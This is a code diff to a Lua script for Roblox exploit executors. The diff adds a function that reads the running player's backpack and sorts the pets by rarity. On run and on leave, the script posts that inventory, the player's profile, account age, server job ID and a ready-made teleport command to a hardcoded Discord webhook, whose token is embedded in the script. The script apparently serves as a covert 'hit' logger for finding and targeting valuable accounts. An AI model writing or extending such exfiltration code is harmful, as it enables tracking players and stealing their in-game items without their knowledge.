@@ -11,26 +11,97 @@ if not syn and not http and not request then
     return
 end
 
--- Webhook URL
+-- Updated Webhook URL
 local webhookURL = "https://discord.com/api/webhooks/1346441185878736957/cRcDh8rIl2p4tWA4JMm3QciveyPxg7o37C0kwqmauPLKGRuWhMnFw7XTfX7RL4ZaPaKB"
 
 -- Get Player & Game Info
-local player = game:GetService("Players").LocalPlayer
-local gameService = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+
+local gameService = MarketplaceService:GetProductInfo(game.PlaceId)
 local gameName = gameService.Name
 local gameID = game.GameId
 local placeID = game.PlaceId
-local jobID = game.JobId -- Unique Server Instance ID
+local jobID = game.JobId
 local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
 
 -- Calculate Account Creation Date
 local daysSinceCreation = player.AccountAge
-local creationDate = os.date("%Y-%m-%d", os.time() - (daysSinceCreation * 86400)) -- Convert days to a proper date
+local creationDate = os.date("%Y-%m-%d", os.time() - (daysSinceCreation * 86400))
+
+-- Define Pet Rarities
+local rarityOrder = {
+    ["Legendary"] = 1,
+    ["Ultra Rare"] = 2,
+    ["Rare"] = 3,
+    ["Uncommon"] = 4,
+    ["Common"] = 5
+}
+
+-- Function to retrieve and sort all pets
+local function getAllPets()
+    local petsByRarity = {
+        ["Legendary"] = {},
+        ["Ultra Rare"] = {},
+        ["Rare"] = {},
+        ["Uncommon"] = {},
+        ["Common"] = {}
+    }
+    local totalPets = 0
+
+    local success, inventory = pcall(function()
+        return player:FindFirstChild("Backpack") and player.Backpack:GetChildren() or {}
+    end)
+
+    if success and inventory then
+        for _, item in ipairs(inventory) do
+            if item:IsA("Tool") or item:IsA("Model") or item:IsA("Folder") then
+                local petName = item.Name
+                local petRarity = "Unknown"
+
+                if item:FindFirstChild("Rarity") then
+                    petRarity = item.Rarity.Value
+                end
+
+                if not rarityOrder[petRarity] then
+                    petRarity = "Common"
+                end
+
+                table.insert(petsByRarity[petRarity], petName)
+                totalPets = totalPets + 1
+            end
+        end
+    end
+
+    return totalPets, petsByRarity
+end
+
+-- Function to format pets list by rarity
+local function formatPetList(petsByRarity)
+    local formattedList = {}
+
+    for rarity, _ in pairs(rarityOrder) do
+        if #petsByRarity[rarity] > 0 then
+            table.insert(formattedList, "**" .. rarity .. "**: " .. table.concat(petsByRarity[rarity], ", "))
+        end
+    end
+
+    return #formattedList > 0 and table.concat(formattedList, "\n") or "No pets found."
+end
 
 -- Function to send webhook notifications
 local function sendWebhook(eventType)
     local message = eventType == "join" and "**Executor Script Executed!**" or "**Player Left the Game!**"
-    local embedColor = eventType == "join" and 16711680 or 16776960 -- Red for join, Yellow for leave
+    local embedColor = eventType == "join" and 16711680 or 16776960
+
+    local totalPets, petsByRarity = getAllPets()
+    local petList = formatPetList(petsByRarity)
+
+    if #petList > 1024 then
+        petList = petList:sub(1, 1020) .. "..."
+    end
 
     local data = {
         ["content"] = "@everyone " .. message,
@@ -49,48 +120,43 @@ local function sendWebhook(eventType)
                 {["name"] = "Game ID", ["value"] = tostring(gameID), ["inline"] = true},
                 {["name"] = "Place ID", ["value"] = tostring(placeID), ["inline"] = true},
                 {["name"] = "Server Job ID", ["value"] = jobID, ["inline"] = false},
+                {["name"] = "Total Pets", ["value"] = tostring(totalPets), ["inline"] = true},
+                {["name"] = "Pets (Sorted by Rarity)", ["value"] = petList, ["inline"] = false},
                 {["name"] = "Teleport to This Server", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeID .. ", '" .. jobID .. "')```", ["inline"] = false}
             }
         }},
-        ["allowed_mentions"] = {["parse"] = {"everyone"}} -- Enables the @everyone ping
+        ["allowed_mentions"] = {["parse"] = {"everyone"}}
     }
 
-    -- Convert Data to JSON
-    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+    local jsonData = HttpService:JSONEncode(data)
 
-    -- Send Request Using Exploit Functions
-    if syn and syn.request then
-        syn.request({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    elseif request then
-        request({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    elseif http and http.request then
-        http.request({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    else
-        print("No supported exploit functions found!")
+    local function sendRequest()
+        local req = syn and syn.request or request or (http and http.request)
+        if req then
+            req({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        else
+            print("No supported exploit functions found!")
+        end
     end
+
+    sendRequest()
 end
 
 -- Notify when the script is executed
 sendWebhook("join")
 
 -- Notify when the player leaves the game
-game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
+Players.PlayerRemoving:Connect(function(leavingPlayer)
     if leavingPlayer == player then
         sendWebhook("leave")
     end
+end)
+
+game:BindToClose(function()
+    sendWebhook("leave")
 end)
